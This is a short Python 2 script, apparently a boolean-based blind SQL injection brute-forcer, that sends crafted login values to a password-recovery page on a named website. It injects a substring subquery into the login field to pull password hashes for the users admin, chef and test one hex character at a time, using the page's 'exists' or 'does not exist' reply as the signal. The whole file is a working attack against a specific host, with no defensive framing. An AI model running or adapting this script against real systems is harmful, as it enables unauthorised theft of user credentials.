__author__ = 'zaza'

import requests
import string

TRUE_WORD = "exists !"
FALSE_WORD = "does not exist"

def isItTrue(text):
    if TRUE_WORD in text:
        return True
    elif FALSE_WORD in text:
        return False

if __name__ == '__main__':
    print "\n\t\tHello to Ze bruteForser\n"
    users = ['admin', 'chef', 'test' ]
    for login in users:
        results = ""
        for x in range (1,33):
            for i in string.hexdigits.lower():
                param = { 'login' : login+'" and (select SUBSTRING(password,'+str(x)
                                    +',1) from utilisateur where login = "'+login+'")="'+i+'"# '}
                r = requests.post("http://www.e-commune.org/lost_login.php", param)
                if isItTrue(r.text):
                    results += i
                    break

        print "password of user "+login+" : " +results
